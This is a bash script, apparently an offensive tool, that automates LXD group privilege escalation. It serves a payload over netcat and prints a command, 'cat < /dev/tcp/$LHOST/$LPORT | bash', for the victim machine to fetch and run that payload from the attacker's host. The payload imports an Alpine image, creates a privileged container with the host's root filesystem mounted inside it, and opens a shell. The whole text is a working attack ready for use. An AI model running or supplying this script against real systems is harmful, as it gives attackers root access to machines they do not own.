#!/usr/bin/env bash

LHOST=$(ifconfig | grep "inet " | cut -d " " -f 10 | grep "10")
LPORT=8000 # Change this

bash ./alpine-builder.sh
echo
echo "Run in the remote machine: bash -c \"cat < /dev/tcp/$LHOST/$LPORT | bash\""
echo "#!/usr/bin/env bash\n\ncd ~\ncat < /dev/tcp/$LHOST/$LPORT > ./alpine.tar.gz\nlxc image import ./alpine.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.\nlxd init\nlxc init myimage mycontainer -c security.privileged=true\nlxc config device add mycontainer mydevice disk source=/ path=/mnt/lxd-exploit/ recursive=true\nlxc start mycontainer\nlxc exec mycontainer /bin/sh" > ./lxd-exploit.sh
echo
nc -q 10 -nvlp $LPORT < ./lxd-exploit.sh
nc -q 10 -nvlp $LPORT < ./alpine.tar.gz
